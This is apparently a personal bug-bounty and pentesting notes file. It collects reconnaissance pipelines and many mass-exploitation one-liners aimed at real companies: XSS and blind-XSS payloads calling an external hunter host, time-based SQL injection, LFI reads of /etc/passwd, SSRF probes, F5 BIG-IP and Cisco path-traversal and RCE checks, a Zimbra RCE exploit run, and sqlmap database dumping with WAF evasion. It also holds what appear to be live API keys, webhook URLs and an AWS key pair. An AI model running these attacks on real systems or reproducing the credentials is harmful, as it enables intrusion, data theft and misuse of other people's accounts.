kady

Methodology
-----------

my slack : https://hooks.slack.com/services/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


slack:
  - id: "vulns"
    slack_channel: "vulns"
    slack_username: "vulns"
    slack_format: "{{data}}"
    slack_webhook_url: "https://hooks.slack.com/services/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"

discord:
  - id: "1031134164113686558"
    discord_channel: "Kady_Pentesting"
    discord_username: "M7moud_mk99#9308"
    discord_format: "{{data}}"
    discord_webhook_url: "https://discord.com/api/webhooks/1031134211043754095/KTjx0xotIC3XJfNJNkoZLX51gkJmQ_zWOEB8sESerHmP8LPcrS-9VnIk9pTCwGwd0Vup"


*******knockpy*************************************************************************************************
--set apikey-virustotal=097948b3270ea8e5b7dfa8273949fa058e6a7aa438bbf724c2b41caad43ebbb2
subfinder --set-config ShodanAPIKey=7OwlgyHtL5Gj9KqH3eF8TvMpLTLbBuRI
censys API ID = f5b19a38-857d-4311-9e41-8c986eb79591
censys Secret = 4e6nbW48hgcNKx7qCqye0qB0WeRpqOwo
tls.bufferover.run x-api-key header value (limit 100 requests/day): k97YdDGgBU2VoqQATNyzS7AeOliQstIranNdVwRn
SecurityTrails = OLLofAoVfo8TWa8ymg693c9oiu91UCyK 
export SHODAN_API_KEY=7OwlgyHtL5Gj9KqH3eF8TvMpLTLbBuRI
shodan init 7OwlgyHtL5Gj9KqH3eF8TvMpLTLbBuRI
Access Key ID: AKIAVRIHSBPKN3LWL26J
Secret Access Key: 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
export AQUATONE_OUT_PATH="~/aquatone"
---------------------------------------------------------------------------------------------------------


nano sub_manually


domainCollector marriott.com 


sudo bash recon.sh
sudo bash kady.sh



with bash

	subfinder -dL sub_manually -silent -all -o sub_subfinder
	
	for URL in $(<sub_manually); do sublist3r "${URL}"; done

	cat sub_sublist3r_* | sort -u | uniq >> sub_sublist3r ; sudo rm -rf sub_sublist3r_*

	for URL in $(<sub_manually); do knockpy "${URL}"; done

	cat sub_manually | waybackurls | unfurl domains >> sub_waybackurls 

	for URL in $(<sub_manually); do gau -subs "${URL}" -b png,jpg,gif,jpeg,swf,woff,gif,svg | unfurl domains >> sub_gau_$URL ; done

	for URL in $(<sub_manually); do amass enum -d $URL -passive -norecursive -noalts -o sub_amass_$URL; done

	for URL in $(<sub_manually); do gitsubs "${URL}" ; done

	cat sub_amass_* sub_subfinder sub_waybackurls sub_github_* sub_sublist3r sub_gau_* sub_col* | sort -u | uniq >> temp_all ; httpx -l temp_all >> subdomains ; rm -rf sub_amass_* sub_subfinder sub_waybackurls sub_github_* sub_col* sub_sublist3r sub_gau_*


	httpx -l temp_all -match-string 'java' -o java
	httpx -l temp_all -match-string 'wordpress' -o wordpress
	httpx -l temp_all -match-string 'grafana' -o grafana
	httpx -l temp_all -match-string 'confluence' -o confluence
	httpx -l temp_all -match-string 'Jira' -o Jira
	httpx -l temp_all -match-string 'tomcat' -o tomcat


Find subdomains using ASNs with Amass
	>> amass intel -org yahoo -max-dns-queries 2500 | awk -F, '{print $1}' ORS=',' | sed 's/,$//' | xargs -P3 -I@ -d ',' amass intel -asn @ -max-dns-queries 2500

	for URL in $(<sub_manually); do curl -s https://crt.sh\?q\=\%.$URL\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u >> sub_crt ; done


Creating customer word-list for fuzzing the parameter:

	for URL in $(<sub_manually); do gau -subs "${URL}" -b png,jpg,gif,jpeg,swf,woff,gif,svg | grep "=" | sed 's/.*.?//' | sed 's/&/\n/' | sed 's/=.*//' >> parmater_$URL ; done

	for URL in $(<sub_manually); do waybackurls "${URL}" | grep "=" | sed 's/.*.?//' | sed 's/&/\n/' | sed 's/=.*//' >> parmater_$URL ; done

	cat parmater_* | sort -u >> parameter 
	rm -rf parmater_*

	for URL in $(<subdomains); do ffuf -u "${URL}/?FUZZ=javascript:prompt(1)" -w parameter -t 300 -ac -mr "javascript:alert(1)" ; done 


inurl:"https://deliveroo" intitle:deliveroo
inurl:"https://www.deliveroo" intitle:deliveroo
site:http://groups.google.com "$COMPANY"

export SHODAN_API_KEY=7OwlgyHtL5Gj9KqH3eF8TvMpLTLbBuRI    
for IP in $(<sub_manually); do uncover -q 'ssl:"$IP"' | cut -d ":" -f 1 | httpx >> IPs_$IP ; done
cat IPs_* >> IPs  
rm -rf IPs_*



for IP in $(<sub_manually); do uncover -e shodan,censys | httpx >> IPsEngines_$IP ; done




for URL in $(<sub_manually); do nslookup $URL >> nslookup_$URL; done
cat nslookup_* >> nslookup | rm -rf nslookup_*


Godfather
sudo nmap -iL IPs -sSV -p- -oA stage__ph -T4 >> IPsnmap
sudo nmap -sV -iL IPs -oN scaned-port.txt --script=vuln




------------------------------------

shodan search ssl:”trendyol.com” --fields ip_str,port --separator " " | awk '{print $1":"$2}' | httpx >> IP_2 

for URL in $(<sub_manually); do shodan search ssl:"${URL}"  --fields ip_str,port --separator " " | awk '{print $1":"$2}' | httpx >> IP_$URL ; done

----------------------------------

---------------------------------------------------------------------------------------------------------------

ORIGN IP >> Direct Acess not allowd Error 1003

	ping stage.pornhub.com

		>> Address: 31.192.117.70 >> visit ip >> Direct Acess not allowd Error 1003 >>

		$ git clone https://github.com/christophetd/cloudflair.git
		$ cd cloudflair
		$ pip3 install -r requirements.txt

					>> sudo docker run --rm -e CENSYS_API_ID=f5b19a38-857d-4311-9e41-8c986eb79591 -e CENSYS_API_SECRET=4e6nbW48hgcNKx7qCqye0qB0WeRpqOwo christophetd/cloudflair pos.toasttab.com


----------------------------------------------------------------------------------------------------------------

cat IPs | nuclei -t ~/nuclei-templates/ -es info -s low,medium,high,critical -stats >> nuclei_IPs

rustscan -a 'IPs' -r 1-65535 | grep Open | tee open_ports.txt | sed 's/Open //' | ./httpx -silent | ./nuclei -t ~/nuclei-templates/ -es info -s low,medium,high,critical -stats >> nuceli_IPs_Open



Make you scans faster 🔥🔥🔥🔥
Ports Scan without CloudFlare  🔥🔥🔥🔥
cat IPs naabu -rate 40000 -silent -verify | httprobe 

-----------------------------------------------------------------------------------------------------------------


nslookup stage.pornhub.com

	>> Address: 47.100.198.195

sudo namp -sSV -p- 47.100.198.195 -oA stage__ph -T4

	>> 60893/tcp open memcache


for URL in $(<sub_manually); do nslookup $URL >> nslookup_$URL; done
cat nslookup_* >> nslookup | rm -rf nslookup_$URL

for IP in $(<IP); do sudo namp -sSV -p- "$IP" -oA stage__ph -T4 >> IPs_$IP ; done
cat IPs_* >> IPs | rm -rf IPs_$IP

---------------------------------------------------------------------------------------------------------------------


cat subdomains | aquatone -chrome-path /snap/chromium -http-timeout 10000 -scan-timeout 300 -ports xlarge -out aquatone
cat IPs | aquatone -chrome-path /snap/chromium -http-timeout 10000 -scan-timeout 300 -ports xlarge -out aquatone_IP


cat subdomains | nuclei -t nuclei-templates/ -stats -es info>> nuclei_output

cat subdomains | nuclei -t nuclei-templates/ -es info -silent | tee -a BugsFound.txt


Scan Acunetix >>>> IPs + subdomains

python3 log4j-scan.py -l subdomains

subzy -targets subdomains

cat 403 | snowBypass


for URL in $(<sub_manually); do takeover -d "${URL}"; done

cat subdomains | python3 s3sec.py

cat subdomains | waybackurls >> waybackurls


cat waybackurls | grep ".xlsx" >> waybackurls_xlsx_pll
cat waybackurls | grep ".csv" >> waybackurls_csv_pll
cat waybackurls | grep ".txt" >> waybackurls_txt_pll
cat waybackurls | grep "amazonaws" >> waybackurls_amazonaws_pll
cat waybackurls | grep -E "\.json(?:onp?)?$" | anew >> temp_js
cat waybackurls | subjs | sort -u | uniq >> temp_js2

cat waybackurls | /nuclei -t ~/nuclei-templates/ -es info -stats >> nuclei_waybackurls_output


cat waybackurls | gf xss | sort -u >> gf_xss
cat waybackurls | gf lfi | sort -u >> gf_lfi
cat waybackurls | gf redirect | sort -u >> gf_redirect
cat waybackurls | gf sqli | sort -u >> gf_sqli
cat waybackurls | gf wordpress | sort -u >> gf_wordpress

sqliTime gf_sqli


cat gf_sqli | sed 's/=[^=&]*/=';WAITFOR DELAY '0:0:5'--/g' | grep ?*= | sort -u | while read host;do (time -p curl -Is $host) 2>&1 | awk '/real/ { r=$2;if (r >= TIME_OF_SLEEP ) print h " => SQLi Time-Based vulnerability"}' h=$host ;done


cat gf_xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"


cat gf_xss  | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq


cat gau | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done


cat gau | sed 's/=[^=&]*/=';WAITFOR DELAY '0:0:5'--/g' | grep ?*= | sort -u | while read host;do (time -p curl -Is $host) 2>&1 | awk '/real/ { r=$2;if (r >= TIME_OF_SLEEP ) print h " => SQLi Time-Based vulnerability"}' h=$host ;done


gospider -S subdomains -a -w -r -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o xss


cat gau | grep '=' | qsreplace '"><svg/onload=alert(1)>'| while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<svg/onload=alert(1)>" && echo "$host \033[0;31m" Vulnerable;done


dalfox -b http://egg.xss.ht file gf_xss


cat IPs | while read ip ; do curl -H "Host: localhost:8100" -H "Content-Type: application/json" -H "Connection: keep-alive, X-F5-Auth-Token X-F5-Auth-Token: a" -H "Authorization: Basic YWRtaW46" \  http://$ip/mgmt/tm/util/bash \ -d '{"command":"run","utilCmdArgs":"-c id"}';done

cat subdomains | while read host do; do curl --connect-timeout 10 -ks -H "X-Requested-With: XMLHttpRequest" -X POST "https://$host/userportal/Controller?mode=8700&operation=1&datagrid=179&json=\{"x":"TEST"\}" | grep -q 'Session Expired' ; done


cat subdomains | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root:x && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done

cat subdomains | while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done

cat subdomains | while read h do ; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x" | grep -qs "onmouse" && echo "$h: VULNERABLE" ; done


cat subdomains | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id"  -mr "uid=" -v -status-code


--------------------------------------------

wget https://github.com/utkusen/socialhunter/releases/download/v0.1.1/socialhunter_0.1.1_Linux_amd64.tar.gz
tar xzvf socialhunter_0.1.1_Linux_amd64.tar.gz
 ./socialhunter -f subdomains

---------------------------------------------



Find admin dashboard
--------------------

wget https://raw.githubusercontent.com/emadshanab/admin-login/main/admin-login.txt

httpx -l subdomains -path admin-login.txt -threads 100 -random-agent -x GET,POST -tech-detect -status-code -follow-redirects -title -content-length -mc 200

httpx -l subdomains -ports 80,443,8009,8080,8081,8090,8180,8443 -path admin-login.txt -threads 100 -random-agent -x GET,POST  -tech-detect -status-code -follow-redirects -title -content-length -mc 200


$ wget https://raw.githubusercontent.com/the-robot/admin-finder/master/wordlist.txt

$ cat subdomains | httpx -ports 80,443,8080,8443 -path admin -mr "admin"

OR

$ cat subdomains | ./httpx -ports 80,443,8080,8443 -path wordlist.txt -mr "password"



	Using some programs:-
	https://github.com/the-c0d3r/admin-finder
	https://github.com/RedVirus0/Admin-Finder
	https://github.com/mIcHyAmRaNe/okadminfinder3
	https://github.com/penucuriCode/findlogin
	https://github.com/fnk0c/cangibrina


for URL in $(<subdomains); do ./feroxbuster --url "${URL}" -k --depth 2 --wordlist SecLists-master/Discovery/Web-Content/common.txt ; done

for URL in $(<subdomains); do ffuf -u "${URL}/FUZZ" -w dicc.txt -mc 200 -t 250 -fs 669 ; done
for URL in $(<subdomains); do ffuf -u "${URL}/FUZZ" -w dicc.txt -mc 200 -t 250 -fs 669 ; done


---------------------------------------------------------



wget https://raw.githubusercontent.com/cujanovic/Virtual-host-wordlist/master/virtual-host-wordlist.txt

cat sub_manually | while read url ; do ffuf -w virtual-host-wordlist.txt -u "$url" -H "Host: FUZZ" -c -v ; done





----------------------------------------------------------------------------------------------------------------------
Oneliner >> LFI >> Download LFi Wordlist Select Path in Terminal >> [https://github.com/hussein98d/LFI-files]
----------------------------------------------------------------------------------------------------------------------

open sessions on mobile

	httpx -l subdomains -path LFI -threads 90 -random-agent -x GET,POST,PUT -title -tech-detect -status-code -follow-redirects -title -mc 200 -match-regex "root:x:" >> LFI_Vuln

	httpx -l gf_lfi -path LFI -threads 90 -random-agent -x GET,POST,PUT -tech-detect -status-code -follow-redirects -title -mc 200 -match-regex "root:x:" >> LFI_Vuln_1


	cat gf_lfi | qsreplace | while read url ; do ffuf -w LFI -u "${url}FUZZ" -mr "root:x" -o ffuf_lfi_multi -v >> LFI_Vuln_2 ; done



	cat subdomains | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n" LFI_Vuln_3 ;done


	cat gf_lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' >> LFI_Vuln_4


	cat subdomains | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path  -mr "root:x" | anew LFI_Vuln_5


	cat gau | qsreplace ".%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./etc/passwd" | httpx -silent -nc -mr "root:x:" -t 250 


	httpx -l subdomains -path LFI -threads 90 -random-agent -x GET,POST,PUT -title -tech-detect -status-code -follow-redirects -title -mc 200 -match-regex "root:x:" >> LFI_Vuln


	httpx -l gf_lfi -path LFI -threads 90 -random-agent -x GET,POST,PUT -tech-detect -status-code -follow-redirects -title -mc 200 -match-regex "root:x:" >> LFI_Vuln_1



	cat subdomains | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n" LFI_Vuln_3 ;done


	cat gf_lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' >> LFI_Vuln_4


	cat subdomains | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path "///////../../../etc/passwd" -mr "root:x" | anew LFI_Vuln_5


	cat gf_lfi | qsreplace | while read url ; do ffuf -w LFI -u "${url}FUZZ" -mr "root:x" -o ffuf_lfi_multi -v >> LFI_Vuln_2 ; done




--------------------------

SSRF

	cat gf_ssrf | sort -u | anew | httpx | qsreplace 'rgbcu1b57z2y3ej8f7vwzni7cyio6d.burpcollaborator.net' | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %"'


	cat gf_ssrf | while read host do;do curl --path-as-is --insecure "$host/?unix:(7701 A's here) | "rgbcu1b57z2y3ej8f7vwzni7cyio6d.burpcollaborator.net" | grep "request caught" && echo "$host \033[0;31mVuln\n" | echo "$host \033[0;32mNot\n";done

	cat gau | grep "=" | qsreplace "rgbcu1b57z2y3ej8f7vwzni7cyio6d.burpcollaborator.net" >> ssrf.txt ; ffuf -c -w ssrf.txt -u FUZZ


-----------------------
Manullay LFI Single url
-----------------------
choose some suspcious link
 2. ffuf -u "redacted.com/?page=FUZZ" -mr "root:x" -w LFI -o ffuf_lfi_single -x http://127.0.0.1:8080

 		take ffuf_lfi_single to windows vps open burpsuite
 			echo "ffuf_lfi_single" -x http://127.0.0.1:8080
 		notice size or search in history


----------------
Oneliner >> Xss 
----------------
• https://github.com/jaeles-project/gospider
• https://github.com/tomnomnom/qsreplace
• https://github.com/hahwul/dalfox


Google Dork find xss
	site:*.target.com inurl:?id= -ap -ca


open 2 sessions on mobile 

	
	gospider -S subdomains -a -w -r -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o xss

	cat gau | grep '=' | qsreplace '"><svg/onload=alert(1)>'| while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<svg/onload=alert(1)>" && echo "$host \033[0;31m" Vulnerable;done



Xss in 10 min linux VPS list url
		
			for URL in $(<subdomains); do paramspider "$URL"; done
		
		cat *** | kxss


Found Blind Xss
		
		gf_xss | dalfox -b http://egg.xss.ht -d confirmxss
	
				OR

		dalfox -b http://egg.xss.ht file gf_xss
	 


Blind XSS at scale 🔥🔥🔥
	
		cat gf_xss | httpx -H "User-Agent: \"><script src=http://egg.xss.ht></script>" 

		cat subdomains | httpx -H "Host: \"><script src=http://egg.xss.ht></script>" 

		And monitor your xss hunter dashboard 🔥🔥🔥




FOR WINDOWS VPS cmd open folder paramspider Single url

	python paramspider.py -d zaful.com --exclude php,jpg,svg -o paramspider
	type "urls.txt" | kxss




For AiriXSS:
cat gf_xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"

For Freq:
cat gf_xss  | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq

Confirm manually by visiting them




cat gau | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done


bxss google dorks 

site:*.target.com inurl:"contact" | inurl:"contact-us" | inurl:"contactus" | inurl:"contcat_us" | inurl:"contact_form" | inurl:"contact-form" 



-----
This is how I found a open redirection. 
Tips:
1)  Used Gau To Get All The URLS
2) Used grep =http Filtered Only URLS with Parameter has http
3) Check these urls manually
4) Boom!
cat gau | grep "=http" | tee out.log
----





OPEN Windows VPS 

--------------------------------------------------
Quick SSTI (RCE) Tip from Twitter
---------------------------------------------------
#Full credit goes too - https://twitter.com/MrDamanSingh/status/1317042176337932291
Had to save this here as I thought it was pretty sick

	1. root@kady:~ cat gau | qsreplace "kady{{9*9}}" > fuzz.txt
	
	2. copy fuzz.txt from linux to windows then open ffuf and burpsutite  

	3. root@kady:~ ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/
	
	4. (captured requests in burp)
	5. search: kady81 in burp

	Could also apply to a few other things beside SSTI
	WIP: Could also pass all QReplaced URLs to Nuclei and Grep for 81 and trigger alert?



Send spider whole sites to burp
List urls+IPs

Downlaod gospider on windows vps 
open burpsuite

gospider -S subdomains -a -w -r --no-redirect -t 50 -c 3 --other-source --include-subs --proxy http://127.0.0.1:8080

gospider -S subdomains -a -w -r --no-redirect -t 50 -c 3 | grep -aEo 'https?://[^ ]+' | sed 's/]$//' | sort -u| grep -aEi "\.(js)"


Fuzz On Spider to do that send the host to Intruder ===> add WordList ===> Start Attack
you can also on Intruder give a Payload list and Start attack on some parameters SQL,SSTI,SSRF,LFI,XSS,Etc..
any cool end do an active Scan

add Parameters list for Param Miner also to check on hidden parameters on burp
while all of this runs i dorking on Github for some finds



Blind XSS via Burpsuite Match and Replace:-
	Save this file as json format and go to:-
		https://github.com/emadshanab/Blind-XSS-burp-match-and-replace
	Or use this repo to generate your json file:- by @fasthm00
		https://github.com/Leoid/MatchandReplace

	Dont forget replace file with your Blind xss

		1:- Burpsuite - Proxy - Options - Match and Replace. 
		2:- Click on the option button and choose load options. 
		3:- Browse for the file and load it to Burpsuite. 
		4:- Import your scope and open the hosts on the browser via multiple url open firefox and chroom extension or use httpx to send the hosts file to Burpsite map
		
		https://chrome.google.com/webstore/detail/open-multiple-urls/oifijhaokejakekmnjmphonojcfkpbbh?hl=en-US https://addons.mozilla.org/en-US/firefox/addon/open-multiple-urls/ 
		
		httpx -l subdomains -threads 100 -http-proxy http://127.0.0.1:8080
		
		5:- You will notice that the blind xss is persent on every request. 6:- Run burpspider and gospider to get more endpoints.

		If you do not have a xsshunter account you can register one and make it short like 2 letters or 4:-
		https://xsshunter.com/
		Finally :- Do not forget to change my blind xss payload with your payload.
		
	Good luck.





##############################################################

Bypass403 subdomains /admin

##############################################################

	Easy $$$ Checking for:- 
			jmx-console
			web-console 
			JMXInvokerServlet 
			admin-console 
			Application Deserialization 
			Servlet Deserialization 
			Jenkins 
			Struts2 

		git clone https://github.com/joaomatosf/jexboss.git 
		cd jexboss 
		pip3 install -r requires.txt 
		Run:- 
		python3 jexboss.py -mode file-scan -file subdomains -out report_file_scan.log 

		Good luck!

##########################################################

DORKS Github,google from one note Fire up 
when you finish add shortcut home phone

		CLIENT_SECRET
		database.url=
		database.user=
		database.password=
		23andme.client.id=
		23andme.client.secret=
		23andme.redirect.uri=
		23andme.host=
		AUTHORIZE_URL=
		ACCESS_TOKEN_URL=
		REDIRECT_URI=
		API_ENDPOINT_URL=



---------------------------------------------------------------------------------------------------------------

Payload used: 0'XOR(if(now()=sysdate(),sleep(10),0)) XOR'Z



---------------------------------------------------------------------------------------------------------------

Zimbra Unauthenticated Remote Code Execution Exploit (CVE-2022-27925)

cat zimbra.json | jq -r '.hostnames[]' | httpx -silent | xargs -I@ sh -c 'python3 http://zimbra-exploit.py @ http://313.zip' | egrep -v '404|401|405|200'


#bugbounty #CVEZIMBRA #CVE-2022-37042

POC
https://github.com/mohamedbenchikh/CVE-2022-27925



----------------------------------------------------------------------------------------------------------------

Tip: When you are doing subdomain enumeration then look for “nagios” keyword in subdomain. it is containing the network status with logs where you get lots of internal (+ip) information.
Ex: 
nagios-*.target.*
http://nagios.target.* 

-----------------------------------------------------------------------------------------------------------------


Find all wordpress on your urls file:-

	httpx -l urls -threads 100  -match-string 'wordpress' -o wordpress.txt

If you have many targets in txt files:-

	cat *.txt | httpx  -threads 100  -match-string 'wordpress' -o wordpress.txt

Test the wordpress via nuclei:-

	nuclei -c 100 -id CVE-2021-24284 -list wordpress.txt -o result

Or use wordpress tag to test all wordpress:-

	nuclei -c 100 -l wordpress.txt  -t nuclei-templates/ -tags wordpress -o wordpress_result 

You can also find symfony,grafana,VMware,confluence,Jira,Elasticsearch,WSO2,Oracle,tomcat,springcloud,bigip,drupal,AEM and more.



--------------------------------------------------------------------------------------------------------------
when ">" Blocked direct alert is Restricted

Bypassed  using below payload
<img src=x onerror=console.log(alert(1)) <

---------------------------------------------------------------------------------------------------------------

- Used links in video : 

https://ultimatedomains.com/extract-domains.php

https://github.com/Cyber-Guy1/domainCollector

Collect Subdomain [Amass]
amass enum -passive -norecursive -noalts -d domain -o subdomain.txt
amass enum -passive -norecursive -noalts -df domains.txt -o sub-domains.txt

Scan Ports 
https://github.com/projectdiscovery/naabu
naabu -p - -list IPs -silent | httpx -silent



cat subs.txt | httpx -o live.txt
cat subs.txt | httpx -t 60 -nc -p top-ports -o live.txt

Collect Endpoints 
https://web.archive.org/cdx/search/cdx?url=*.XXX&fl=original&collapse=urlkey

Github Searching For Leaked Credentials

Shodan Searching
ssl:"X" 200
Ssl.cert.subject.CN:"X" 200

Explain Critical Easy Bugs To Find…..
  
Great Enumerations Scripts 
https://github.com/six2dez/reconftw
https://github.com/yogeshojha/rengine
https://github.com/iamthefrogy/frogy
https://github.com/Cyber-Guy1/Subdomainer



https://twitter.com/GodfatherOrwa
https://bugcrowd.com/orwagodfather
https://hackerone.com/mr-hakhak?type=user



ssl shooper

--------------------------------------------------------------

1st: collect all ip's from shodan
shodan search http://Ssl.cert.subject.CN:"http://target.com*" 200 --fields ip_str | httpx | tee ips.txt
2nd: fuzz all ips using dirsearch

----------------------------------------------------------------

SQL injection Oneliner.
subfinder -dL domains.txt | dnsx | waybackurl | uro  | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
Always remember, oneliners don’t replace manual hunting.🔥

---------------------------------------------------------------------

Found an interesting API endpoint ? Here's how to fuzz it 🔥🔥🔥

ffuf -u https://target.com/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412
Here are some sick wordlists 🔥🔥🔥

https://github.com/Net-hunter121/API-Wordlist

----------------------------------------------------------------------


Reflected value check by extracting hidden params.

curl -skL "https://www.ford.com.cn" | grep 'type="hidden"' | grep -Eo 'name="[^\"]+"' | cut -d'"' -f2 | xargs -I@ sh -c 'if curl -skL https://www.ford.com.cn/?@=ijkl | grep -q "value=ijkl"; then echo "reflection found from @ param"; fi'

--------------------------------------------------------------

Found an interesting API endpoint ? Here's how to fuzz it 🔥🔥🔥

ffuf -u https://target.com/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412

wordlist 
wget https://github.com/Net-hunter121/API-Wordlist/archive/refs/heads/master.zip


------------------------------------------------------------------


1st: collect all ip's from shodan

	shodan search http://Ssl.cert.subject.CN:"http://target.com*" 200 --fields ip_str | httpx | tee 

2nd: fuzz all ips using dirsearch by windwos vps

	cat all_ip's.txt | httpx | tee live_ip's.txt

	cat live_ips.txt | nuclei -t ~/custom_templates 


-------------------------------------------------------------------

My Way to Fast massive xss

---> tools:
cleanP : https://github.com/raoufmaklouf/cleanP
injectP: https://github.com/raoufmaklouf/injectP
XSS.yaml : https://gist.githubusercontent.com/.../8044a6115.../XSS.yaml

[1] single target:
cat gau | cleanP |  injectP 'T%22rSpGeUMo%3E7N' | httpx -ms 'T"rSpGeUMo>7N' | nuclei -t XSS.yaml -o xss.txt
&
cat AllEndPoint.txt | cleanP |  injectP 'T%22rSpGeUMo%3E7N' | httpx -ms 'T"rSpGeUMo>7N' | nuclei -t XSS.yaml -o xss.txt

[2] multi target

xss.sh file:

while read -r line;
do
   cat $(<subdomains) | cleanP |  injectP 'T%22rSpGeUMo%3E7N' | httpx -ms 'T"rSpGeUMo>7N' | nuclei -t nuclei-templates/vulnerabilities/generic/top-xss-params.yaml -o nuclei_XSS;
done 




xss1.sh file:

while read -r line;
do
   gau $line | cleanP |  injectP 'T%22rSpGeUMo%3E7N' | httpx -ms 'T"rSpGeUMo>7N' | nuclei -tags xss -o nuclei_XSS1;
done 


Run the bash script:
chmod +x xss.sh
chmod +x xss1.sh
cat subdomains | ./xss.sh
cat subdomains | ./xss1.sh

-----------------------------------------------------------------------------------------------
brute force Subdomain

sed -i s/$/.domain.com/ subdomains-topmillion.txt

cat subdomains-topmillion.txt | httpx


-----------------------------------------------------------------------------


SQL Scnairo
	echo "site.com" | wayback | uro | grep .php > php-files.txt
	cat php-files.txt| grep -i get | sed 's/.*.get//' | sort -u
	cat php-files.txt| grep -i get | sed 's/.*.get//' | cut -f1 -d"." | sort -u
	cat php-files.txt| grep -i get | sed 's/.*.get//' | cut -f1 -d"." | sed 's/[A-Z]\+/\n&/g'| sort -u

	ffuf -w lowercase-parameters.txt -u "https://redacted.org/searchProgressCommitment.php?FUZZ=5"
	
	no luck then add post
	
	ffuf -w lowercase-parameters.txt -X POST -d "FUZZ=5" -u "https://redacted.org/searchProgressCommitment.php"

Ok now go to the endpoint and intercept the request with burp and change the request method, add the parameter, and copy it to a txt file to run sqlmap on it.

Exploitation:
The command will be:

	sqlmap -r req3.txt -p commitment --force-ssl --level 5 --risk 3 --dbms=”MYSQL” --hostname --current-user --current-db --dbs --tamper=between --no-cast

	--level 5 --> Level of tests to perform.
	--risk 3 --> Risk of tests to perform
	--dbms --> back-end DBMS value
	--no-cast --> to avoid use cast-alike statements during data fetching
	--tamper --> to evade filters and WAF’s
	"--hostname --current-user --current-db --dbs" --> to retrieve info about the database





--------------------------------------------

wget https://github.com/utkusen/socialhunter/releases/download/v0.1.1/socialhunter_0.1.1_Linux_amd64.tar.gz
tar xzvf socialhunter_0.1.1_Linux_amd64.tar.gz
cd socialhunter/
 ./socialhunter -f ../subdomains


CVE-2020-5902

cat subdomains | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done


CVE-2020-3452

cat subdomains | while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done 

CVE-2022-0378

cat subdomains | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done


Extract IPs from a File

cat file.txt | grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt


Get Subdomains from IPs

python3 hosthunter.py HOSTS.txt > OUT.txt


	>> amass intel -org "Netflix"
To verify that you have correct ASNs, just use the whois tool to make sure that they really belong to your target:
	whois AS2906
	whois AS40027

Find subdomains using ASNs with Amass
	>> amass intel -org yahoo -max-dns-queries 2500 | awk -F, '{print $1}' ORS=',' | sed 's/,$//' | xargs -P3 -I@ -d ',' amass intel -asn @ -max-dns-queries 2500

Track Amass for domains Then, you can track new findings each day via:
	>> amass track -d domain.com | grep "Found"
